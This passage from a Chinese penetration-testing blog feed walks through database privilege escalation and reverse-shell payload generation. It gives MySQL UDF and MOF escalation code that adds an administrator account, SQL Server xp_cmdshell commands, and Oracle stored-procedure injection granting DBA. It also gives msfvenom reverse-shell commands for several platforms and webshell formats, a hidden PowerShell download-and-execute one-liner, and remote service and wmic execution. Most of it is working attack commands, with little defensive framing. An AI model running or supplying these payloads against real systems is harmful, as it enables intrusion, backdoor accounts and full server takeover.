src="QQ%E6%88%AA%E5%9B%BE20200428170940.png" alt=""></p><p>注：这里注意版本，适用于5.5.9以下，</p><h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -d mysql://root:xxxxxx<span class="variable">@VPS</span>:3306/mysql --os-shell</span><br></pre></td></tr></table></figure><h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p><h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p><p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p><p>文件内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription")</span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">Name = <span class="string">"filtP2"</span>;</span><br><span class="line">Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line"><span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></span><br><span class="line"><span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user test test /add\")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = <span class="variable">$Consumer</span>;</span><br><span class="line">Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里<code>net user test test /add</code>可以自定义，我们这里就是添加一个test用户。</p><p>之后我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">"C:/phpStudy/WWW/nullevt.mof"</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">"c:/windows/system32/wbem/mof/nullevt.mof"</span></span><br></pre></td></tr></table></figure><p>可以使用菜刀下的数据库管理工具执行</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p><p>执行后，到win2003上查看用户：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p><p>之后我们可以将自定义的命令改为：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.exe localgroup administrators test /<span class="keyword">add</span></span><br></pre></td></tr></table></figure><p>即可对添加的用户进行提权。</p><h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p><h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p><p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p><h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>​        Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p><ul><li>在程序数据库连接文件中尽量不要使用Root帐号进行连接。</li><li>Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</li><li>对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</li></ul><h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p><p>xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。</p><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p><strong>利用前提：</strong></p><ul><li>getshell或者存在sql注入并且能够执行命令</li><li>sql server是system权限，sql server默认就是system权限。</li><li>获取SA用户口令</li></ul><h5 id="获取SA用户口令方法"><a href="#获取SA用户口令方法" class="headerlink" title="获取SA用户口令方法"></a>获取SA用户口令方法</h5><ul><li>Webshell或源码获取，一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">conn.aspx</span><br><span class="line">config.aspx</span><br><span class="line">config.php</span><br><span class="line">web.config</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">一般格式如：</span><br><span class="line"></span><br><span class="line"><span class="attribute">server</span>=localhost;</span><br><span class="line"><span class="attribute">UID</span>=sa;</span><br><span class="line"><span class="attribute">PWD</span>=shadowflow</span><br></pre></td></tr></table></figure><p>获得sa口令，即可通过我们上传的大马进行登录，获得sa相应权限</p><p>有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。</p><h5 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>, 1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span>,1;reconfigure;</span><br></pre></td></tr></table></figure><h5 id="关闭xp-cmdshell"><a href="#关闭xp-cmdshell" class="headerlink" title="关闭xp_cmdshell"></a>关闭xp_cmdshell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>, 1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span>, 0;reconfigure</span><br></pre></td></tr></table></figure><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net user test pinohd123. /add'</span>    添加用户<span class="built_in">test</span>，密码<span class="built_in">test</span></span><br><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net localgroup administrators test add'</span>    添加<span class="built_in">test</span>用户到管理员组</span><br></pre></td></tr></table></figure><h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>SYS创建的存储过程<code>存在sql注入</code>（EG：CVE-2005-4832）</li><li>用户拥有<code>create procedure</code>权限（用来创建函数）</li></ul><h4 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h4><p>假设有一个用户quan 只有 CONNECT 和 RESOURCE 权限</p><h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul><li>用户登陆后执行<code>select * from session_privs</code>查看权限</li><li>创建函数，命令为<code>grant dba to quan</code></li></ul><p>grant execute on pwn to public;//赋予所有用户此函数的执行权限</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span>&gt;<span class="keyword">create</span> <span class="keyword">or replace</span> <span class="keyword">function</span> pwn <span class="keyword">return</span> vaarchar2</span><br><span class="line">authid <span class="built_in">current_user</span> <span class="keyword">is</span> pragma autonomous_transaction;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">execute</span> <span class="keyword">immediate</span> <span class="string">'grant dba to quan'</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>&gt;<span class="keyword">grant</span> <span class="keyword">execute</span> <span class="keyword">on</span> pwn <span class="keyword">to</span> <span class="built_in">public</span>;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>注入sys.dbms_cdc_subscribe.activate_subscription</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt;begin</span><br><span class="line">sys.dbms_cdc_subscribe.activate_subscription(<span class="string">'''||quan.pwn()||'''</span>);</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">SQL&gt;set role dba;</span><br></pre></td></tr></table></figure><p>执行<code>select * from session_privs</code>查看是否为dba权限</p><h5 id="利用MSF注入"><a href="#利用MSF注入" class="headerlink" title="利用MSF注入"></a>利用MSF注入</h5><p>1.加载攻击模块</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/sqli/<span class="keyword">oracle</span>/dbms_cdc_subscribe.activate_subscription</span><br></pre></td></tr></table></figure><p>2.配置参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> dbuser quan</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> dbpass quan123</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sid orcl</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> rhost xxxxx</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sql grant dba <span class="keyword">to</span> quan</span><br></pre></td></tr></table></figure><p>3.run</p><h3 id="Oracle数据库提权之通过utl-http-request存储过程提权"><a href="#Oracle数据库提权之通过utl-http-request存储过程提权" class="headerlink" title="Oracle数据库提权之通过utl_http.request存储过程提权"></a>Oracle数据库提权之通过utl_http.request存储过程提权</h3><h4 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h4><p>Oracle9i~11gR2中<code>dbms_xmlquery.newcontext()</code>和<code>dbms_xmlquery.getxml()</code>函数可以执行任意PL/SQL语句，利用这两个函数可以获得Oracle服务器的<strong>操作系统权限</strong>。</p><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>UTL_HTTP存储过程可用</li><li>Oracle9i~11gR2</li></ul><h4 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h4><ol><li>创建Java包</li><li>创建存储过程MYJAVACMD</li><li>执行存储过程，成功添加用户</li></ol><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/0nc3/p/12081189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nc3/p/12081189.html</a></p><p><a href="https://www.webshell.cc/4790.html" target="_blank" rel="noopener">https://www.webshell.cc/4790.html</a></p><p><a href="https://xz.aliyun.com/t/2719" target="_blank" rel="noopener">https://xz.aliyun.com/t/2719</a></p><p><a href="https://blog.csdn.net/qq_26090065/article/details/81515355" target="_blank" rel="noopener">https://blog.csdn.net/qq_26090065/article/details/81515355</a></p><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试中常见提权方式总结（二）&quot;&gt;&lt;a href=&quot;#渗透测试中常见提权方式总结（二）&quot; class=&quot;headerlink&quot; title=&quot;渗透测试中常见提权方式总结（二）&quot;&gt;&lt;/a&gt;渗透测试中常见提权方式总结（二）&lt;/h2&gt;&lt;h3 id=&quot;数据库提权&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="提权" scheme="https://shu1l.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>msf反弹payload学习</title>
    <link href="https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/</id>
    <published>2020-04-27T05:30:20.000Z</published>
    <updated>2020-05-17T11:27:34.605Z</updated>
    
    <content type="html"><![CDATA[<h2 id="学习msfvenom生成反弹payload总结"><a href="#学习msfvenom生成反弹payload总结" class="headerlink" title="学习msfvenom生成反弹payload总结"></a>学习msfvenom生成反弹payload总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code>我们知道目前来说流行的shell主要有两种，一种是正向shell(bind_shell)一种是反向shell(reverse_shell)</code></pre><p><strong>正向shell</strong>:攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。(攻击者-&gt;被攻击者)</p><p><strong>反向shell:</strong>被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。(攻击者&lt;-被攻击者)</p><p><strong>nc</strong>可以实现一个很简单的正向与反向shell连接的示例：</p><p>正向</p><p><img src="1208761-20190108155228561-656308830.png" alt=""></p><p>反向</p><p><img src="1208761-20190108140558839-392665606.png" alt=""></p><p>对于实际的渗透测试过程来说，我们常常使用的往往是反弹shell的方式来突破边界防火墙的限制。</p><p><strong>下面列举了一些使用反向shell的情况：</strong></p><ul><li>目标机器在一个不同（相对攻击者而言）的私有网络</li><li>目标机器的防火墙阻挡了所有入口连接（这种情况正向 Shell 是会被防火墙阻挡的）.</li><li>由于一些原因，你的 Payload 不能绑定在应该绑定的端口的时候</li><li>你还不能确定应该选择反向 Shell 还是正向 Shell 的时候</li></ul><h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>​        msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线。Msfvenom 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。为了开始使用 msfvenom，可以首先浏览一下它所支持的命令参数：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427142626.png" alt=""></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Options:</span><br><span class="line">    -p, <span class="comment">--payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span></span><br><span class="line">        <span class="comment">--payload-options            List the payload's standard options # 列出指定 Payload 的标准可选配置项</span></span><br><span class="line">    -l, <span class="comment">--list          [type]       List a module type. Options are: payloads, encoders, nops, all # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all</span></span><br><span class="line">    -n, <span class="comment">--nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload # 指定 nop 在 payload 中的数量（译者注：类似堆喷射中通过 nop 滑动到 payload）</span></span><br><span class="line">    -f, <span class="comment">--format        &lt;format&gt;     Output format (use --help-formats for a list) # 指定 Payload 的输出格式</span></span><br><span class="line">        <span class="comment">--help-formats               List available formats # 列出所有可用的输出格式</span></span><br><span class="line">    -e, <span class="comment">--encoder       &lt;encoder&gt;    The encoder to use # 指定使用的 Encoder</span></span><br><span class="line">    -a, <span class="comment">--arch          &lt;arch&gt;       The architecture to use # 指定目标系统架构</span></span><br><span class="line">        <span class="comment">--platform      &lt;platform&gt;   The platform of the payload # 指定目标系统平台</span></span><br><span class="line">        <span class="comment">--help-platforms             List available platforms # 列出可用的平台</span></span><br><span class="line">    -s, <span class="comment">--space         &lt;length&gt;     The maximum size of the resulting payload # 设置未经编码的 Payload 的最大长度</span></span><br><span class="line">        <span class="comment">--encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value) # 编码后的 Payload 的最大长度</span></span><br><span class="line">    -b, <span class="comment">--bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff' # 设置需要在 Payload 中避免出现的字符</span></span><br><span class="line">    -i, <span class="comment">--iterations    &lt;count&gt;      The number of times to encode the payload # 设置 Payload 的编码次数</span></span><br><span class="line">    -c, <span class="comment">--add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include # 指定包含一个额外的win32 shellcode文件</span></span><br><span class="line">    -x, <span class="comment">--template      &lt;path&gt;       Specify a custom executable file to use as a template # 指定一个特定的可执行文件作为模板</span></span><br><span class="line">    -k, <span class="comment">--keep                       Preserve the template behavior and inject the payload as a new thread # 保护模板程序的功能，注入的payload作为一个新的进程运行</span></span><br><span class="line">    -o, <span class="comment">--out           &lt;path&gt;       Save the payload # 保存 Payload 到文件</span></span><br><span class="line">    -v, <span class="comment">--var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats # 指定一个变量名</span></span><br><span class="line">（译者注：当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span><br><span class="line">        <span class="comment">--smallest                   Generate the smallest possible payload # 尽可能生成最短的 Payload</span></span><br><span class="line">    -h, <span class="comment">--help                       Show this message # 帮助</span></span><br></pre></td></tr></table></figure><p>我们可以通过命令列出可用的payloads、encoders、nops。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="comment">--list payloads</span></span><br><span class="line">msfvenom <span class="comment">--list encoders</span></span><br><span class="line">msfvenom <span class="comment">--list nops</span></span><br></pre></td></tr></table></figure><p>下面我们使用msf生成一些可用的反弹shell的paylaod。</p><h4 id="生成二进制文件"><a href="#生成二进制文件" class="headerlink" title="生成二进制文件"></a>生成二进制文件</h4><p>关于二进制文件，主要介绍适用于Windows、linux、mac操作系统的payload生成与利用。</p><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt; <span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt; <span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt;<span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>针对这个部分就以Windows为例，使用上面的命令生成一个exe的payload，命令如下：</p><p>攻击机:kali  192.168.153.176</p><p>靶机: win7   192.168.153.160</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span> LPORT=<span class="number">5555</span> -f exe -o payload.exe</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200427153433.png" alt=""></p><p>复制shell.exe到Windows机器，然后kali下开启msf使用如下命令监听4444端口：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfconsole    <span class="comment">//启动msf</span></span><br><span class="line"></span><br><span class="line">use exploit/multi/handler          <span class="comment">//使用msf的侦听模块exploit/multi/handler</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> PAYLOAD <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span>        //设置载荷<span class="comment">payload</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 192.168.153.176</span>               //设置本地监听机<span class="comment">Ip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT  4444</span>              //设置监听端口</span><br><span class="line">     </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>执行完之后在Windows下执行payload.exe，然后结果如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427153539.png" alt=""></p><p>在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：</p><ul><li>双击运行</li><li>cmd下运行exe</li><li>利用Powershell远程下载执行</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (<span class="built_in">new</span>-<span class="keyword">object</span> <span class="keyword">system</span>.net.webclient).downloadfile(<span class="string">'http://127.0.0.1:8089'</span>,<span class="string">'shell.exe'</span>);</span><br><span class="line"><span class="keyword">start</span>-process shell.exe</span><br></pre></td></tr></table></figure><ul><li>利用at或schtasks设置计划任务执行</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span>\c$ <span class="string">"admin123"</span> /user:pt007</span><br><span class="line">net use</span><br><span class="line">dir \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span>\c$</span><br><span class="line">copy test.exe \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span>\c$</span><br><span class="line">sc \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span> create test binpath= <span class="string">"c:\test.exe"</span></span><br><span class="line">sc \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span> start test</span><br><span class="line">sc \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span> del test</span><br></pre></td></tr></table></figure><ul><li>利用wmic远程命令执行</li></ul><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /<span class="keyword">node</span><span class="title">:192</span>.<span class="number">168.1</span>.<span class="number">158</span> /user:pt007 /password:admin123  process call create <span class="string">"cmd.exe /c ipconfig&gt;d:\result.txt"</span></span><br></pre></td></tr></table></figure><h4 id="生成webshell脚本"><a href="#生成webshell脚本" class="headerlink" title="生成webshell脚本"></a><strong>生成webshell脚本</strong></h4><p>​    在做web渗透的时候，经常会用到webshell，我们经常用的一句话用菜刀连接，这里介绍下如何使用msfvenom生成webshell。</p><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt; <span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f<span class="built_in"> raw </span>&gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo <span class="string">'&lt;?php '</span> | tr -d <span class="string">'\n'</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure><h4 id="如何利用-1"><a href="#如何利用-1" class="headerlink" title="如何利用"></a>如何利用</h4><p>下面以php为例做一下测试，使用以下命令生成一个webshell：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 